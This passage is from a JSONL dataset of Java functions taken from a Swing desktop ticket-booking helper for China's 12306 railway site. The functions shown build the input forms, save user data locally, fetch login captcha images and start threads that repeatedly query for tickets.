GridBagConstraints();\n\tgbc_textName.fill = GridBagConstraints.HORIZONTAL;\n\tgbc_textName.insets = new Insets(0, 0, 0, 5);\n\tgbc_textName.gridx = 4;\n\tgbc_textName.gridy = 1;\n\tpanel_2.add(textName, gbc_textName);\n\ttextName.setColumns(10);\n\n\ttextMobile = new JTextField();\n\tGridBagConstraints gbc_textMobile = new GridBagConstraints();\n\tgbc_textMobile.fill = GridBagConstraints.HORIZONTAL;\n\tgbc_textMobile.insets = new Insets(0, 0, 0, 5);\n\tgbc_textMobile.gridx = 5;\n\tgbc_textMobile.gridy = 1;\n\tpanel_2.add(textMobile, gbc_textMobile);\n\ttextMobile.setColumns(10);\n\n\tcomboTicketType = new JComboBox();\n\tcomboTicketType.setModel(new DefaultComboBoxModel(TicketType.values()));\n\tGridBagConstraints gbc_comboTicketType = new GridBagConstraints();\n\tgbc_comboTicketType.gridx = 6;\n\tgbc_comboTicketType.gridy = 1;\n\tpanel_2.add(comboTicketType, gbc_comboTicketType);\n}", "path": "src\\main\\java\\lab\\ticket\\view\\PassengerPanel.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * \u7ed1\u5b9aUI\u6570\u636e\u5230\u6a21\u578b\u5bf9\u8c61\n * @return\n */\n", "func_signal": "public PassengerData bindUItoModel()", "code": "{\n\tlogger.debug(\"Binding UI data for passenger: {}\", textCardNo.getText());\n\tPassengerData passengerData = new PassengerData();\n\tif (chckbxSelect.isSelected()) {\n\t\tpassengerData.setSelected(true);\n\t} else {\n\t\tpassengerData.setSelected(false);\n\t}\n\tpassengerData.setCardNo(textCardNo.getText());\n\tpassengerData.setCardType((CardType) comboCardType.getSelectedItem());\n\tpassengerData.setName(textName.getText());\n\tpassengerData.setMobile(textMobile.getText());\n\tpassengerData.setTicketType((TicketType) comboTicketType.getSelectedItem());\n\treturn passengerData;\n}", "path": "src\\main\\java\\lab\\ticket\\view\\PassengerPanel.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * \u8ffd\u52a0\u6a21\u5f0f\u6784\u9020UI\u5bf9\u8c61\n * @param container\n * @param append\n */\n", "func_signal": "public PassengerPanel(TicketMainFrame container, boolean append)", "code": "{\n\tthis(container);\n\tif (append) {\n\t\tbtnLineOP.setText(\"-\");\n\t}\n}", "path": "src\\main\\java\\lab\\ticket\\view\\PassengerPanel.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * Create the frame.\n */\n", "func_signal": "public TicketMainFrame()", "code": "{\n\n\tfinal String filePath = System.getProperty(\"user.dir\") + File.separator + \"12306.dat\";\n\n\taddWindowListener(new WindowAdapter() {\n\t\t@Override\n\t\tpublic void windowClosing(WindowEvent event) {\n\t\t\ttry {\n\t\t\t\tObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(filePath));\n\t\t\t\tout.writeObject(frame.bindUItoModel());\n\t\t\t\tout.close();\n\t\t\t\tlogger.debug(\"Saved UI data to file: {}\", filePath);\n\t\t\t} catch (Exception e) {\n\t\t\t\tlogger.error(\"Save UI data to file error\", e);\n\t\t\t}\n\t\t}\n\n\t\t@Override\n\t\tpublic void windowOpened(WindowEvent event) {\n\t\t\ttry {\n\t\t\t\t// \u521d\u59cb\u5316\u8d2d\u7968\u65e5\u671f\u4e3a20\u5929\u9884\u552e\u671f\u65e5\u671f\n\t\t\t\tCalendar trainDate = Calendar.getInstance();\n\t\t\t\ttrainDate.add(Calendar.DAY_OF_MONTH, 19);\n\t\t\t\ttextPrimaryTrainDate.setText(new SimpleDateFormat(\"yyyy-MM-dd\").format(trainDate.getTime()));\n\n\t\t\t\t// \u57fa\u4e8e\u4e0a\u6b21\u4fdd\u5b58\u7684dat\u6570\u636e\u6587\u4ef6\u6062\u590dUI\u7ec4\u4ef6\u521d\u59cb\u503c\n\t\t\t\tFile inFile = new File(filePath);\n\t\t\t\tif (!inFile.exists()) {\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t\tObjectInputStream in = new ObjectInputStream(new FileInputStream(inFile));\n\t\t\t\tTicketData ticketData = (TicketData) in.readObject();\n\t\t\t\tin.close();\n\t\t\t\tlogger.debug(\"Loaded UI data from file: {}\", filePath);\n\t\t\t\ttextTrainFrom.setText(ticketData.getTrainFrom());\n\t\t\t\ttextTrainTo.setText(ticketData.getTrainTo());\n\t\t\t\ttextExtraTrainDates.setText(ticketData.getExtraTrainDates());\n\t\t\t\t// \u521d\u59cb\u5316\u767b\u5f55\u7528\u6237\u4fe1\u606f\n\t\t\t\tList<UserData> userDatas = ticketData.getUserDatas();\n\t\t\t\tif (userDatas != null && userDatas.size() > 0) {\n\t\t\t\t\tfor (int i = 0; i < userDatas.size(); i++) {\n\t\t\t\t\t\tUserData userData = userDatas.get(i);\n\t\t\t\t\t\tif (i == 0) {\n\t\t\t\t\t\t\tdefaultUserPanel.bindModeltoUI(userData, true);\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tUserPanel userPanel = addUserPanel();\n\t\t\t\t\t\t\tuserPanel.bindModeltoUI(userData);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t// \u521d\u59cb\u5316\u4e58\u5ba2\u4fe1\u606f\n\t\t\t\tList<PassengerData> passengerDatas = ticketData.getPassengerDatas();\n\t\t\t\tif (passengerDatas != null && passengerDatas.size() > 0) {\n\t\t\t\t\tfor (int i = 0; i < passengerDatas.size(); i++) {\n\t\t\t\t\t\tPassengerData passengerData = passengerDatas.get(i);\n\t\t\t\t\t\tif (i == 0) {\n\t\t\t\t\t\t\tdefaultPassengerPanel.bindModeltoUI(passengerData);\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tPassengerPanel passengerPanel = addPassengerPanel();\n\t\t\t\t\t\t\tpassengerPanel.bindModeltoUI(passengerData);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t} catch (Exception e) {\n\t\t\t\tlogger.error(\"Load UI data from file error\", e);\n\t\t\t}\n\t\t}\n\t});\n\n\tsetTitle(\"12306-hunter: Java Swing C/S\u7248\u672c12306\u8ba2\u7968\u52a9\u624b. \u672c\u7a0b\u5e8f\u5b8c\u5168\u5f00\u653e\u6e90\u4ee3\u7801\uff0c\u4ec5\u4f5c\u4e3a\u6280\u672f\u5b66\u4e60\u4ea4\u6d41\u4e4b\u7528\uff0c\u4e0d\u5f97\u7528\u4e8e\u4efb\u4f55\u5546\u4e1a\u7528\u9014.\");\n\tsetExtendedState(JFrame.MAXIMIZED_BOTH);\n\tsetDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n\tsetBounds(100, 100, 1051, 781);\n\tm_contentPane = new JPanel();\n\tsetContentPane(m_contentPane);\n\tGridBagLayout gbl_m_contentPane = new GridBagLayout();\n\tgbl_m_contentPane.columnWidths = new int[] { 1024, 0 };\n\tgbl_m_contentPane.rowHeights = new int[] { 50, 150, 126, 39, 148, 0 };\n\tgbl_m_contentPane.columnWeights = new double[] { 1.0, Double.MIN_VALUE };\n\tgbl_m_contentPane.rowWeights = new double[] { 0.0, 0.0, 0.0, 0.0, 1.0, Double.MIN_VALUE };\n\tm_contentPane.setLayout(gbl_m_contentPane);\n\n\tpanel_4 = new JPanel();\n\tGridBagConstraints gbc_panel_4 = new GridBagConstraints();\n\tgbc_panel_4.fill = GridBagConstraints.BOTH;\n\tgbc_panel_4.insets = new Insets(0, 0, 5, 0);\n\tgbc_panel_4.gridx = 0;\n\tgbc_panel_4.gridy = 0;\n\tm_contentPane.add(panel_4, gbc_panel_4);\n\tpanel_4.setBorder(new TitledBorder(UIManager.getBorder(\"TitledBorder.border\"),\n\t\t\t\"\\u7B2C\\u4E00\\u6B65\\uFF1A\\u8F93\\u5165\\u4E58\\u8F66\\u4FE1\\u606F\", TitledBorder.LEADING, TitledBorder.TOP,\n\t\t\tnull, null));\n\tGridBagLayout gbl_panel_4 = new GridBagLayout();\n\tgbl_panel_4.columnWidths = new int[] { 68, 100, 54, 94, 0, 80, 77, 200, 0, 0 };\n\tgbl_panel_4.rowHeights = new int[] { 37, 0 };\n\tgbl_panel_4.columnWeights = new double[] { 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Double.MIN_VALUE };\n\tgbl_panel_4.rowWeights = new double[] { 0.0, Double.MIN_VALUE };\n\tpanel_4.setLayout(gbl_panel_4);\n\n\tlblNewLabel_4 = new JLabel(\"\u8d77\u7ad9\");\n\tGridBagConstraints gbc_lblNewLabel_4 = new GridBagConstraints();\n\tgbc_lblNewLabel_4.insets = new Insets(0, 0, 0, 5);\n\tgbc_lblNewLabel_4.anchor = GridBagConstraints.EAST;\n\tgbc_lblNewLabel_4.gridx = 0;\n\tgbc_lblNewLabel_4.gridy = 0;\n\tpanel_4.add(lblNewLabel_4, gbc_lblNewLabel_4);\n\n\ttextTrainFrom = new JTextField();\n\ttextTrainFrom.setToolTipText(\"\u5fc5\u987b\u586b\u5199\u7cbe\u786e\u7684\u7ad9\u70b9\u540d\u79f0\");\n\tGridBagConstraints gbc_textTrainFrom = new GridBagConstraints();\n\tgbc_textTrainFrom.insets = new Insets(0, 0, 0, 5);\n\tgbc_textTrainFrom.fill = GridBagConstraints.HORIZONTAL;\n\tgbc_textTrainFrom.gridx = 1;\n\tgbc_textTrainFrom.gridy = 0;\n\tpanel_4.add(textTrainFrom, gbc_textTrainFrom);\n\ttextTrainFrom.setColumns(10);\n\n\tlblNewLabel_5 = new JLabel(\"\u5230\u7ad9\");\n\tGridBagConstraints gbc_lblNewLabel_5 = new GridBagConstraints();\n\tgbc_lblNewLabel_5.insets = new Insets(0, 0, 0, 5);\n\tgbc_lblNewLabel_5.anchor = GridBagConstraints.EAST;\n\tgbc_lblNewLabel_5.gridx = 2;\n\tgbc_lblNewLabel_5.gridy = 0;\n\tpanel_4.add(lblNewLabel_5, gbc_lblNewLabel_5);\n\n\ttextTrainTo = new JTextField();\n\ttextTrainTo.setToolTipText(\"\u5fc5\u987b\u586b\u5199\u7cbe\u786e\u7684\u7ad9\u70b9\u540d\u79f0\");\n\tGridBagConstraints gbc_textTrainTo = new GridBagConstraints();\n\tgbc_textTrainTo.fill = GridBagConstraints.HORIZONTAL;\n\tgbc_textTrainTo.insets = new Insets(0, 0, 0, 5);\n\tgbc_textTrainTo.gridx = 3;\n\tgbc_textTrainTo.gridy = 0;\n\tpanel_4.add(textTrainTo, gbc_textTrainTo);\n\ttextTrainTo.setColumns(10);\n\n\tlblNewLabel_6 = new JLabel(\"\u4e58\u8f66\u65e5\u671f\");\n\tGridBagConstraints gbc_lblNewLabel_6 = new GridBagConstraints();\n\tgbc_lblNewLabel_6.insets = new Insets(0, 0, 0, 5);\n\tgbc_lblNewLabel_6.anchor = GridBagConstraints.EAST;\n\tgbc_lblNewLabel_6.gridx = 4;\n\tgbc_lblNewLabel_6.gridy = 0;\n\tpanel_4.add(lblNewLabel_6, gbc_lblNewLabel_6);\n\n\ttextPrimaryTrainDate = new JTextField();\n\ttextPrimaryTrainDate.setToolTipText(\"\u6bcf\u6b21\u542f\u52a8\u81ea\u52a8\u8bbe\u5b9a\u4e3a\u5f53\u524d\u65e5\u671f20\u5929\u540e\u9884\u552e\u671f\");\n\tGridBagConstraints gbc_textPrimaryTrainDate = new GridBagConstraints();\n\tgbc_textPrimaryTrainDate.insets = new Insets(0, 0, 0, 5);\n\tgbc_textPrimaryTrainDate.fill = GridBagConstraints.HORIZONTAL;\n\tgbc_textPrimaryTrainDate.gridx = 5;\n\tgbc_textPrimaryTrainDate.gridy = 0;\n\tpanel_4.add(textPrimaryTrainDate, gbc_textPrimaryTrainDate);\n\ttextPrimaryTrainDate.setColumns(10);\n\n\tlabel = new JLabel(\"\u5907\u9009\u65e5\u671f\");\n\tGridBagConstraints gbc_label = new GridBagConstraints();\n\tgbc_label.anchor = GridBagConstraints.EAST;\n\tgbc_label.insets = new Insets(0, 0, 0, 5);\n\tgbc_label.gridx = 6;\n\tgbc_label.gridy = 0;\n\tpanel_4.add(label, gbc_label);\n\n\ttextExtraTrainDates = new JTextField();\n\ttextExtraTrainDates.setToolTipText(\"\u4e3b\u8981\u7528\u5728\u6307\u5b9a\u591a\u4e2a\u65e5\u671f\u5237\u201c\u9000\u7968\u201d\");\n\ttextExtraTrainDates.setColumns(10);\n\tGridBagConstraints gbc_textExtraTrainDates = new GridBagConstraints();\n\tgbc_textExtraTrainDates.insets = new Insets(0, 0, 0, 5);\n\tgbc_textExtraTrainDates.fill = GridBagConstraints.HORIZONTAL;\n\tgbc_textExtraTrainDates.gridx = 7;\n\tgbc_textExtraTrainDates.gridy = 0;\n\tpanel_4.add(textExtraTrainDates, gbc_textExtraTrainDates);\n\n\tlblNewLabel = new JLabel(\"\u683c\u5f0f\uff1a\u6309\u7167\u9884\u8ba1\u4e58\u8f66\u201c\u65e5\u201d\u4f18\u5148\u7ea7\u9017\u53f7\u5206\u9694\u586b\u5199\uff0c\u598220,19,18,14\");\n\tGridBagConstraints gbc_lblNewLabel = new GridBagConstraints();\n\tgbc_lblNewLabel.gridx = 8;\n\tgbc_lblNewLabel.gridy = 0;\n\tpanel_4.add(lblNewLabel, gbc_lblNewLabel);\n\n\tuserPanelContainer = new JPanel();\n\tuserPanelContainer.setBorder(new TitledBorder(UIManager.getBorder(\"TitledBorder.border\"),\n\t\t\t\"\\u7B2C\\u4E8C\\u6B65\\uFF1A\\u7528\\u6237\\u53CA\\u8F66\\u6B21\\u8BBE\\u7F6E\", TitledBorder.LEADING,\n\t\t\tTitledBorder.TOP, null, null));\n\tGridBagConstraints gbc_userPanelContainer = new GridBagConstraints();\n\tgbc_userPanelContainer.fill = GridBagConstraints.BOTH;\n\tgbc_userPanelContainer.insets = new Insets(0, 0, 5, 0);\n\tgbc_userPanelContainer.gridx = 0;\n\tgbc_userPanelContainer.gridy = 1;\n\tm_contentPane.add(userPanelContainer, gbc_userPanelContainer);\n\tuserPanelContainer.setLayout(new GridLayout(0, 1, 0, 0));\n\n\tpassengerPanelContainer = new JPanel();\n\tpassengerPanelContainer.setBorder(new TitledBorder(UIManager.getBorder(\"TitledBorder.border\"), \"\\u7B2C\\u4E09\\u6B65\\uFF1A\\u4E58\\u8F66\\u4EBA\\u4FE1\\u606F\", TitledBorder.LEADING, TitledBorder.TOP, null, null));\n\tGridBagConstraints gbc_passengerPanelContainer = new GridBagConstraints();\n\tgbc_passengerPanelContainer.fill = GridBagConstraints.HORIZONTAL;\n\tgbc_passengerPanelContainer.insets = new Insets(0, 0, 5, 0);\n\tgbc_passengerPanelContainer.gridx = 0;\n\tgbc_passengerPanelContainer.gridy = 2;\n\tm_contentPane.add(passengerPanelContainer, gbc_passengerPanelContainer);\n\n\tpanelOperation = new JPanel();\n\tGridBagConstraints gbc_panelOperation = new GridBagConstraints();\n\tgbc_panelOperation.fill = GridBagConstraints.BOTH;\n\tgbc_panelOperation.insets = new Insets(0, 0, 5, 0);\n\tgbc_panelOperation.gridx = 0;\n\tgbc_panelOperation.gridy = 3;\n\tm_contentPane.add(panelOperation, gbc_panelOperation);\n\tpanelOperation.setLayout(new FlowLayout(FlowLayout.CENTER, 5, 5));\n\n\tbtnStart = new JButton(\"\u5f00\u59cb\u81ea\u52a8\u5237\u7968\");\n\tbtnStart.addActionListener(new ActionListener() {\n\t\tpublic void actionPerformed(ActionEvent e) {\n\n\t\t\tTicketData ticketData = frame.bindUItoModel();\n\n\t\t\tTicketMainFrame.appendMessage(\"-------\u586b\u5199\u4fe1\u606f\u68c0\u67e5---\u5f00\u59cb---------\");\n\t\t\tTicketMainFrame.appendMessage(\"\u57fa\u4e8e\u8f93\u5165\u7684[\u8d77\u70b9\u7ad9:\" + textTrainFrom.getText() + \",\u7ec8\u70b9\u7ad9\uff1a\" + textTrainTo.getText()\n\t\t\t\t\t+ \",\u4e58\u8f66\u65e5\u671f\uff1a\" + textPrimaryTrainDate.getText() + \"]\u67e5\u8be2\u8f66\u7968\u4fe1\u606f\u54cd\u5e94:\");\n\t\t\tUserData firstUserData = ticketData.getFirstUserData();\n\t\t\tif (!firstUserData.isLoginSuccess()) {\n\t\t\t\tTicketMainFrame.appendMessage(\"\u9519\u8bef\uff1a\u7b2c\u4e00\u4e2a\u7528\u6237\u8d26\u53f7\u5fc5\u987b\u6210\u529f\u767b\u5f55\");\n\t\t\t\tJOptionPane.showMessageDialog(frame, \"\u9519\u8bef\uff1a\u7b2c\u4e00\u4e2a\u7528\u6237\u8d26\u53f7\u5fc5\u987b\u6210\u529f\u767b\u5f55\");\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tList<TrainQueryInfo> trainQueryInfos = httpClientService.queryTrain(ticketData, firstUserData,\n\t\t\t\t\tticketData.getPrimaryTrainDate());\n\t\t\tfor (TrainQueryInfo trainQueryInfo : trainQueryInfos) {\n\t\t\t\tTicketMainFrame.appendMessage(trainQueryInfo.toString());\n\n\t\t\t}\n\t\t\tString fmtMessage = \"%s\u8f66\u6b21 > \u767b\u5f55\u8d26\u53f7:%s, \u8f66\u6b21\uff1a%s, \u5e2d\u522b\uff1a%s\";\n\t\t\tfor (UserData userData : ticketData.getUserDatas()) {\n\t\t\t\tfor (TrainData trainData : userData.getTrainDatas()) {\n\t\t\t\t\tboolean valid = false;\n\t\t\t\t\tfor (TrainQueryInfo trainQueryInfo : trainQueryInfos) {\n\t\t\t\t\t\tif (trainQueryInfo.validateTrainData(trainData)) {\n\t\t\t\t\t\t\tvalid = true;\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tString msg = String.format(fmtMessage, (valid ? \"\u6709\u6548\" : \"\u65e0\u6548\"), userData.getLoginUser(),\n\t\t\t\t\t\t\ttrainData.getTrainNo(), trainData.getSeatType());\n\t\t\t\t\tTicketMainFrame.appendMessage(msg);\n\t\t\t\t\tif (!valid) {\n\t\t\t\t\t\tJOptionPane.showMessageDialog(frame, msg);\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tTicketMainFrame.appendMessage(\"-------\u586b\u5199\u4fe1\u606f\u68c0\u67e5---\u5b8c\u6bd5---------\");\n\n\t\t\tbtnStart.setEnabled(false);\n\t\t\t//\u57fa\u4e8e\u767b\u5f55\u8d26\u53f7\u542f\u52a8\u5237\u7968\u7ebf\u7a0b\n\t\t\tfor (UserData userData : ticketData.getUserDatas()) {\n\t\t\t\tif (userData.isLoginSuccess()) {\n\t\t\t\t\tTicketUserThread ticketThread = new TicketUserThread(frame, httpClientService, ticketData,\n\t\t\t\t\t\t\tuserData);\n\t\t\t\t\tticketThread.start();\n\t\t\t\t\tticketThreads.add(ticketThread);\n\t\t\t\t} else {\n\t\t\t\t\tTicketMainFrame.appendMessage(\"\u5ffd\u7565\u672a\u6210\u529f\u767b\u5f55\u7528\u6237\u8d26\u53f7\uff1a\" + userData.getLoginUser());\n\t\t\t\t}\n\t\t\t}\n\t\t\tbtnStop.setEnabled(true);\n\t\t}\n\t});\n\tpanelOperation.add(btnStart);\n\n\tbtnStop = new JButton(\"\u505c\u6b62\u81ea\u52a8\u5237\u7968\");\n\tbtnStop.addActionListener(new ActionListener() {\n\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\tbtnStop.setEnabled(false);\n\t\t\tif (ticketThreads != null) {\n\t\t\t\tfor (TicketUserThread ticketThread : ticketThreads) {\n\t\t\t\t\tticketThread.sendTerminalSign();\n\t\t\t\t}\n\t\t\t}\n\t\t\tticketThreads.clear();\n\t\t\tbtnStart.setEnabled(true);\n\t\t}\n\t});\n\tpanelOperation.add(btnStop);\n\n\tlabel_2 = new JLabel(\"\");\n\tpanelOperation.add(label_2);\n\n\tpanelLogger = new JPanel();\n\tpanelLogger.setBorder(new TitledBorder(null, \"\\u8FD0\\u884C\\u8BB0\\u5F55\", TitledBorder.LEADING,\n\t\t\tTitledBorder.TOP, null, null));\n\tGridBagConstraints gbc_panelLogger = new GridBagConstraints();\n\tgbc_panelLogger.fill = GridBagConstraints.BOTH;\n\tgbc_panelLogger.gridx = 0;\n\tgbc_panelLogger.gridy = 4;\n\tm_contentPane.add(panelLogger, gbc_panelLogger);\n\tpanelLogger.setLayout(new GridLayout(0, 1, 0, 0));\n\n\tscrollPaneLogger = new JScrollPane();\n\tpanelLogger.add(scrollPaneLogger);\n\n\tconsoleArea = new JTextArea();\n\tscrollPaneLogger.setViewportView(consoleArea);\n\tDefaultCaret caret = (DefaultCaret) consoleArea.getCaret();\n\tcaret.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);\n\n\tdefaultUserPanel = new UserPanel(this);\n\tuserPanelContainer.add(defaultUserPanel);\n\tpassengerPanelContainer.setLayout(new GridLayout(0, 2, 0, 0));\n\n\tdefaultPassengerPanel = new PassengerPanel(this);\n\tpassengerPanelContainer.add(defaultPassengerPanel);\n}", "path": "src\\main\\java\\lab\\ticket\\TicketMainFrame.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * \u57fa\u4e8e\u767b\u5f55\u7528\u6237Cookie\u6570\u636e\u6784\u5efa\u767b\u9646\u9a8c\u8bc1\u7801\u56fe\u7247\n * @param cookieData\n * @return\n */\n", "func_signal": "public File buildLoginCodeImage(Map<String, String> cookieData)", "code": "{\n\tHttpClient httpClient = buildHttpClient();\n\tFile file = new File(System.getProperty(\"java.io.tmpdir\") + File.separator + cookieData.get(\"JSESSIONID\")\n\t\t\t+ \".login.jpg\");\n\ttry {\n\t\tString url = \"https://dynamic.12306.cn/otsweb/passCodeNewAction.do?module=login&rand=sjrand\";\n\t\tHttpResponse response = getHttpRequest(httpClient, url, null, cookieData);\n\t\tHttpEntity entity = response.getEntity();\n\t\tInputStream instream = entity.getContent();\n\t\tOutputStream out = new FileOutputStream(file);\n\t\tbyte[] tmp = new byte[1];\n\t\twhile ((instream.read(tmp)) != -1) {\n\t\t\tout.write(tmp);\n\t\t}\n\t\tout.close();\n\t\tinstream.close();\n\t\tTicketMainFrame.appendMessage(\"\u66f4\u65b0\u767b\u5f55\u9a8c\u8bc1\u7801\u56fe\u50cf:\" + file.getAbsolutePath());\n\t\treturn file;\n\t} catch (Exception e) {\n\t\tthrow new IllegalStateException(e);\n\t} finally {\n\t\thttpClient.getConnectionManager().shutdown();\n\t}\n}", "path": "src\\main\\java\\lab\\ticket\\service\\HttpClientService.java", "repo_name": "xautlx/12306-hunter", "stars": 96, "license": "None", "language": "java", "size": 2348}
{"docstring": "/**\n * Create the dialog.\n */\n", "func_signal": "public RandomCodeDialog()", "code": "{\n\taddWindowListener(new WindowAdapter() {\n\t\t@Override\n\t\tpublic void windowClosing(WindowEvent e) {\n\t\t\ttextSubmitCode.setText(\"\");\n\t\t\tdoSubmitCode();\n\t\t}\n\t});\n\tsetAlwaysOnTop(true);\n\tsetTitle(\"\u6709\u7968\u4e86\uff0c\u8d76\u5feb\u8f93\u5165\u4e0b\u5355\u9a8c\u8bc1\u7801\");\n\tsetBounds(100, 100, 473, 349);\n\tgetContentPane().setLayout(new BorderLayout());\n\tcontentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));\n\tgetContentPane().add(contentPanel, BorderLayout.CENTER);\n\tcontentPanel.setLayout(new GridLayout(0, 1, 0, 0));\n\t{\n\t\tJPanel panel = new JPanel();\n\t\tcontentPanel.add(panel);\n\t\tGridBagLayout gbl_panel = new GridBagLayout();\n\t\tgbl_panel.columnWidths = new int[] { 81, 20, 157, 0, 0 };\n\t\tgbl_panel.rowHeights = new int[] { 50, 30, 30, 30, 30, 50, 32, 0 };\n\t\tgbl_panel.columnWeights = new double[] { 0.0, 0.0, 0.0, 1.0, Double.MIN_VALUE };\n\t\tgbl_panel.rowWeights = new double[] { 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Double.MIN_VALUE };\n\t\tpanel.setLayout(gbl_panel);\n\t\t{\n\t\t\tJLabel label = new JLabel(\"\u5237\u7968\u6b21\u6570\uff1a\");\n\t\t\tlabel.setFont(new Font(\"\u5b8b\u4f53\", Font.PLAIN, 14));\n\t\t\tGridBagConstraints gbc_label = new GridBagConstraints();\n\t\t\tgbc_label.anchor = GridBagConstraints.EAST;\n\t\t\tgbc_label.insets = new Insets(0, 0, 5, 5);\n\t\t\tgbc_label.gridx = 0;\n\t\t\tgbc_label.gridy = 0;\n\t\t\tpanel.add(label, gbc_label);\n\t\t}\n\t\t{\n\t\t\tlblCount = new JLabel(\"\");\n\t\t\tlblCount.setFont(new Font(\"\u5b8b\u4f53\", Font.PLAIN, 14));\n\t\t\tGridBagConstraints gbc_lblCount = new GridBagConstraints();\n\t\t\tgbc_lblCount.fill = GridBagConstraints.HORIZONTAL;\n\t\t\tgbc_lblCount.insets = new Insets(0, 0, 5, 5);\n\t\t\tgbc_lblCount.gridx = 2;\n\t\t\tgbc_lblCount.gridy = 0;\n\t\t\tpanel.add(lblCount, gbc_lblCount);\n\t\t}\n\t\t{\n\t\t\tJLabel label = new JLabel(\"\u767b\u5f55\u8d26\u53f7\uff1a\");\n\t\t\tlabel.setFont(new Font(\"\u5b8b\u4f53\", Font.PLAIN, 14));\n\t\t\tGridBagConstraints gbc_label = new GridBagConstraints();\n\t\t\tgbc_label.insets = new Insets(0, 0, 5, 5);\n\t\t\tgbc_label.gridx = 0;\n\t\t\tgbc_label.gridy = 1;\n\t\t\tpanel.add(label, gbc_label);\n\t\t}\n\t\t{\n\t\t\tlblLoginUser = new JLabel(\"\");\n\t\t\tlblLoginUser.setFont(new Font(\"\u5b8b\u4f53\", Font.PLAIN, 14));\n\t\t\tGridBagConstraints gbc_lblLoginUser = new GridBagConstraints();\n\t\t\tgbc_lblLoginUser.anchor = GridBagConstraints.WEST;\n\t\t\tgbc_lblLoginUser.insets = new Insets(0, 0, 5, 5);\n\t\t\tgbc_lblLoginUser.gridx = 2;\n\t\t\tgbc_lblLoginUser.gridy = 1;\n\t\t\tpanel.add(lblLoginUser, gbc_lblLoginUser);\n\t\t}\n\t\t{\n\t\t\tJLabel label = new JLabel(\"\u4e58\u8f66\u65e5\u671f\uff1a\");\n\t\t\tlabel.setFont(new Font(\"\u5b8b\u4f53\", Font.PLAIN, 14));\n\t\t\tGridBagConstraints gbc_label = new GridBagConstraints();\n\t\t\tgbc_label.anchor = GridBagConstraints.EAST;\n\t\t\tgbc_label.insets = new Insets(0, 0, 5, 5);\n\t\t\tgbc_label.gridx = 0;\n\t\t\tgbc_label.gridy = 2;\n\t\t\tpanel.add(label, gbc_label);\n\t\t}\n\t\t{\n\t\t\tlblTrainDate = new JLabel(\"\");\n\t\t\tlblTrainDate.setFont(new Font(\"\u5b8b\u4f53\", Font.PLAIN, 14));\n\t\t\tGridBagConstraints gbc_lblTrainDate = new GridBagConstraints();\n\t\t\tgbc_lblTrainDate.anchor = GridBagConstraints.WEST;\n\t\t\tgbc_lblTrainDate.insets = new Insets(0, 0, 5, 5);\n\t\t\tgbc_lblTrainDate.gridx = 2;\n\t\t\tgbc_lblTrainDate.gridy = 2;\n\t\t\tpanel.add(lblTrainDate, gbc_lblTrainDate);\n\t\t}\n\t\t{\n\t\t\tJLabel lblNewLabel_1 = new JLabel(\"\u4e58\u8f66\u8f66\u6b21\uff1a\");\n\t\t\tlblNewLabel_1.setFont(new Font(\"\u5b8b\u4f53\", Font.PLAIN, 14));\n\t\t\tGridBagConstraints gbc_lblNewLabel_1 = new GridBagConstraints();\n\t\t\tgbc_lblNewLabel_1.anchor = GridBagConstraints.EAST;\n\t\t\tgbc_lblNewLabel_1.insets = new Insets(0, 0, 5, 5);\n\t\t\tgbc_lblNewLabel_1.gridx = 0;\n\t\t\tgbc_lblNewLabel_1.gridy = 3;\n\t\t\tpanel.add(lblNewLabel_1, gbc_lblNewLabel_1);\n\t\t}\n\t\t{\n\t\t\tlblTrainNo = new JLabel(\"\");\n\t\t\tlblTrainNo.setFont(new Font(\"\u5b8b\u4f53\", Font.PLAIN, 14));\n\t\t\tGridBagConstraints gbc_lblTrainNo = new GridBagConstraints();\n\t\t\tgbc_lblTrainNo.fill = GridBagConstraints.HORIZONTAL;\n\t\t\tgbc_lblTrainNo.insets = new Insets(0, 0, 5, 5);\n\t\t\tgbc_lblTrainNo.gridx = 2;\n\t\t\tgbc_lblTrainNo.gridy = 3;\n\t\t\tpanel.add(lblTrainNo, gbc_lblTrainNo);\n\t\t}\n\t\t{\n\t\t\tJLabel lblNewLabel_3 = new JLabel(\"\u5ea7\u4f4d\u5e2d\u522b\uff1a\");\n\t\t\tlblNewLabel_3.setFont(new Font(\"\u5b8b\u4f53\", Font.PLAIN, 14));\n\t\t\tGridBagConstraints gbc_lblNewLabel_3 = new GridBagConstraints();\n\t\t\tgbc_lblNewLabel_3.anchor = GridBagConstraints.EAST;\n\t\t\tgbc_lblNewLabel_3.insets = new Insets(0, 0, 5, 5);\n\t\t\tgbc_lblNewLabel_3.gridx = 0;\n\t\t\tgbc_lblNewLabel_3.gridy = 4;\n\t\t\tpanel.add(lblNewLabel_3, gbc_lblNewLabel_3);\n\t\t}\n\t\t{\n\t\t\tlblSeatType = new JLabel(\"\");\n\t\t\tlblSeatType.setFont(new Font(\"\u5b8b\u4f53\", Font.PLAIN, 14));\n\t\t\tGridBagConstraints gbc_lblSeatType = new GridBagConstraints();\n\t\t\tgbc_lblSeatType.fill = GridBagConstraints.HORIZONTAL;\n\t\t\tgbc_lblSeatType.insets = new Insets(0, 0, 5, 5);\n\t\t\tgbc_lblSeatType.gridx = 